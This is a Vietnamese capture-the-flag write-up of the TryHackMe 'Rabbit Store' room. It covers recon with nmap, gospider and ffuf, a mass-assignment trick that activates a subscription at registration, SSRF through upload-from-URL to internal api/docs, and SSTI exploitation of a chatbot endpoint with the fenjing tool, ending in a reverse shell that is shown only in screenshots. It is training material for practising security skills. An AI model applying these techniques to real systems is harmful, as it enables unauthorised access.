# Rabbit Store

<img width="1484" height="494" alt="image" src="https://github.com/user-attachments/assets/631e00cc-8da1-4939-a837-15c0bd6691d9" />

Sau khi tôi sử dụng nmap với target `10.201.46.30` thì có 2 port:

```
❯ sudo nmap 10.201.46.30
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-27 14:24 +0700
Nmap scan report for cloudsite.thm (10.201.46.30)
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.69 seconds
```

Sau khi truy cập vào thì chuyển hướng đến tên miền `cloudsite.thm` có giao diện như này:

<img width="1875" height="985" alt="image" src="https://github.com/user-attachments/assets/329469bf-7148-4e9e-90aa-ba60e008f3cd" />

SỬ dụng thì cũng không có nhiều tiếng năng gì, dùng gospider thì có xuất hiện subdomain:

```
❯ gospider -s "http://cloudsite.thm/" -o output -c 10 -d 1
[url] - [code-200] - http://cloudsite.thm/
[subdomains] - http://storage.cloudsite.thm
[subdomains] - https://storage.cloudsite.thm
[href] - http://cloudsite.thm/assets/css/bootstrap.min.css
[href] - http://cloudsite.thm/assets/css/fontawsom-all.min.css
[href] - http://cloudsite.thm/assets/plugins/testimonial/css/owl.carousel.min.css
[href] - http://cloudsite.thm/assets/plugins/testimonial/css/owl.theme.min.css
[href] - http://cloudsite.thm/assets/css/style.css
[href] - http://cloudsite.thm/
[href] - http://cloudsite.thm/about_us.html
[href] - http://cloudsite.thm/services.html
[href] - http://cloudsite.thm/blog.html
[href] - http://cloudsite.thm/contact_us.html
[href] - http://cloudsite.thm/blog_single.html
[href] - https://www.smarteyeapps.com/
[javascript] - http://cloudsite.thm/assets/js/jquery-3.2.1.min.js
[javascript] - http://cloudsite.thm/assets/js/bootstrap.min.js
[javascript] - http://cloudsite.thm/assets/plugins/testimonial/js/owl.carousel.min.js
[javascript] - http://cloudsite.thm/assets/plugins/scroll-fixed/jquery-scrolltofixed-min.js
[javascript] - http://cloudsite.thm/assets/js/script.js
[url] - [code-200] - http://cloudsite.thm/assets/plugins/scroll-fixed/jquery-scrolltofixed-min.js
[url] - [code-200] - http://cloudsite.thm/assets/js/script.js
[url] - [code-200] - http://cloudsite.thm/assets/plugins/testimonial/js/owl.carousel.min.js
[url] - [code-200] - http://cloudsite.thm/assets/js/bootstrap.min.js
[linkfinder] - [from: http://cloudsite.thm/assets/js/bootstrap.min.js] - text/html
[linkfinder] - http://cloudsite.thm/assets/js/text/html
[linkfinder] - http://cloudsite.thm/text/html
[url] - [code-200] - http://cloudsite.thm/assets/js/jquery-3.2.1.min.js
[linkfinder] - [from: http://cloudsite.thm/assets/js/jquery-3.2.1.min.js] - text/xml
[linkfinder] - http://cloudsite.thm/assets/js/text/xml
[linkfinder] - http://cloudsite.thm/text/xml
[linkfinder] - [from: http://cloudsite.thm/assets/js/jquery-3.2.1.min.js] - text/plain
[linkfinder] - http://cloudsite.thm/assets/js/text/plain
[linkfinder] - http://cloudsite.thm/text/plain
[linkfinder] - [from: http://cloudsite.thm/assets/js/jquery-3.2.1.min.js] - text/html
[linkfinder] - [from: http://cloudsite.thm/assets/js/jquery-3.2.1.min.js] - application/x-www-form-urlencoded
[linkfinder] - http://cloudsite.thm/assets/js/application/x-www-form-urlencoded
[linkfinder] - http://cloudsite.thm/application/x-www-form-urlencoded
```

Tôi có fuzz endpoint và subdomain nhưng không có gì đặc biệt lắm.

Truy cập vào subdomain là giao diện của login:

<img width="1869" height="978" alt="image" src="https://github.com/user-attachments/assets/decee813-5dae-4258-901c-73e7c5404a78" />

Có vẻ trang đăng nhập và đăng ký không có sqli, tôi tiếp tục thử đăng ký tài khoản và truy cập vào thì như này:

<img width="1873" height="980" alt="image" src="https://github.com/user-attachments/assets/0cf775f8-0c4c-4bd7-885e-d0b75509c763" />

Kiểm tra thì có jwt và có xuất hiện `"subscription":"inactive"`

<img width="1867" height="573" alt="image" src="https://github.com/user-attachments/assets/7d882e00-4676-4239-8892-55a18416506c" />

Tôi đã thử chỉnh sửa nhưng không được, thử crack key jwt cũng không được, quay lại phần đăng ký thì nó có dạng json:

<img width="1514" height="861" alt="image" src="https://github.com/user-attachments/assets/c026535a-e4b2-4bd3-855e-ea455769005e" />

Ở phần đăng ký thì thêm `"subscription":"active"` vào và vẫn successfully

<img width="1510" height="891" alt="image" src="https://github.com/user-attachments/assets/9490283b-8e27-4c3f-b275-69844d728015" />

Check lại jwt ở login thì `"subscription":"active"`:

<img width="1837" height="783" alt="image" src="https://github.com/user-attachments/assets/a3a8b418-cfae-412b-b038-3a3d4fafe0f0" />

Lúc này giao diện của website đã thay đổi, có thể upload các file

<img width="1871" height="976" alt="image" src="https://github.com/user-attachments/assets/e663ea48-c6dd-47e0-bb2b-831de7d6d6bc" />

Ở phần upload file trực tiếp thì tôi chưa tìm ra cái gì, tôi nghi ngờ ở `Upload From URL` có thể có ssrf

Đầu tiên thì tôi thử với ip của tôi trước, lúc này trả về 2 kết quả, thành công hoặc không thành công:

<img width="1471" height="827" alt="image" src="https://github.com/user-attachments/assets/b2bbf828-011f-49c8-9c43-34eb574dea37" />

<img width="1526" height="874" alt="image" src="https://github.com/user-attachments/assets/4f11159e-86dc-43f2-a22b-309d1ebe4002" />

Có vẻ nó chỉ hoạt động với http:

<img width="1491" height="788" alt="image" src="https://github.com/user-attachments/assets/1987e7b2-feb8-40f2-8a52-a0f3bdae0eb0" />

Dùng burp intruder để scan các port thì xuất hiện 2 port gồm 80 và 3000 

<img width="1869" height="987" alt="image" src="https://github.com/user-attachments/assets/17864b4f-2641-4bd3-8e1d-e2052f9f49ee" />

Ở đây thì port 80 là của `cloudsite.thm` và 3000 là của `storage.cloudsite.thm`, trong quá trình fuzz `https://storage.cloudsite.thm` thì có:

```
❯ ffuf -u "http://storage.cloudsite.thm/FUZZ" -w ~/wordlist/super_mega_wordlist.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/FUZZ
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/super_mega_wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

//////////              [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 419ms]
//////                  [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 419ms]
api/docs                [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 289ms]
api/login               [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 290ms]
assets                  [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 280ms]
assets/                 [Status: 200, Size: 2495, Words: 162, Lines: 25, Duration: 286ms]
css                     [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 280ms]
css/                    [Status: 200, Size: 1352, Words: 82, Lines: 19, Duration: 283ms]
fonts                   [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 280ms]
.hta                    [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 279ms]
.htaccess               [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htaccess~              [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htaccess.bak           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 280ms]
.htaccess.BAK           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 279ms]
.htaccessBAK            [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 280ms]
.htaccess.bak1          [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 280ms]
.htaccess-dev           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 278ms]
.htaccess_extra         [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 279ms]
.htaccess-local         [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 282ms]
.htaccess-marco         [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htaccess.old           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htaccessOLD2           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 280ms]
.htaccessOLD            [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htaccess.orig          [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 285ms]
.htaccess_orig          [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 283ms]
.htaccess.sample        [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 280ms]
.htaccess_sc            [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 279ms]
.htaccess.save          [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htaccess.txt           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 278ms]
.htgroup                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 281ms]
.htpasswd               [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 279ms]
.htpasswd-old           [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 285ms]
.htpasswds              [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 292ms]
.htpasswd_test          [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 278ms]
.httr-oauth             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 280ms]
.htusers                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 277ms]
.ht_wsr.txt             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 278ms]
images                  [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 281ms]
images/                 [Status: 200, Size: 750, Words: 52, Lines: 16, Duration: 281ms]
index.html              [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 280ms]
javascript              [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 280ms]
js                      [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 278ms]
js/                     [Status: 200, Size: 1544, Words: 93, Lines: 20, Duration: 280ms]
```

Tôi thử truy cập vào `api/docs` để xem thử:

<img width="1424" height="667" alt="image" src="https://github.com/user-attachments/assets/77639616-4405-4cbf-aed0-5376464c7173" />

<img width="1502" height="753" alt="image" src="https://github.com/user-attachments/assets/e233628e-602e-4017-acde-03871e112591" />

Xuất hiện `/api/fetch_messeges_from_chatbot` nhìn khá lạ:

<img width="1481" height="748" alt="image" src="https://github.com/user-attachments/assets/ee99a248-3980-4ff8-b103-b5052f48460e" />

Tôi kiểm tra thì thấy ở phần thông báo này có dính xss và ssti:

<img width="1493" height="857" alt="image" src="https://github.com/user-attachments/assets/43871ea1-3d55-43dc-b570-135e4a3838ee" />

<img width="1473" height="680" alt="image" src="https://github.com/user-attachments/assets/bf95c64e-8202-4746-9378-25eb158953a7" />

Tôi dùng tool để khai thác ssti:

```
python -m fenjing crack-json --url 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' --json-data '{"username":"hello"}' --key username --cookies 'jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhQGFhLmFhIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzYxNTUwMzI3LCJleHAiOjE3NjE1NTM5Mjd9.jgWnkM3ewDKG7vek8JnTICOJl-46s7zJOlhv4eG0QBU' --detect-mode fast
```

Tôi dùng reverse shell:

<img width="1884" height="953" alt="image" src="https://github.com/user-attachments/assets/d21ec77c-9eea-4cbc-8cd5-7bdf359edb36" />

<img width="915" height="348" alt="image" src="https://github.com/user-attachments/assets/c23f194c-c628-4d2e-a517-867512f56b8a" />

